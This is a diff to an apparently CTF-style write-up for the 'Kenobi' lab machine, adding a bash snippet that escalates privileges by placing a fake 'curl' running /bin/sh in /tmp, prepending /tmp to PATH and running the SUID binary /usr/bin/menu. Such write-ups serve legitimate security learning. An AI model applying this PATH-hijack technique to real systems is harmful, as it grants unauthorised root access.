@@ -1,7 +1,5 @@
 # Kenobi
 
-<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
-
 {% hint style="info" %}
 A basic NFS, FTP and SMB machine. exploiting all of those will lead to an  RCE from which we can <mark style="color:red;">**manipulate a user's ssh key**</mark>.
 
@@ -154,5 +152,11 @@ $strings /usr/bin/menu
 
 Yeah well, executing curl, but WHICH curl ? :smile: if we change the $PATH variable to something of our choice instead of that curl command, it will execute ours.
 
-<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+```bash
+kenobi@kenobi:~$ echo /bin/sh > /tmp/curl
+kenobi@kenobi:~$ chmod +x /tmp/curl 
+kenobi@kenobi:~$ export PATH=/tmp:$PATH
+kenobi@kenobi:~$ /usr/bin/menu 
+```
 
+<figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>
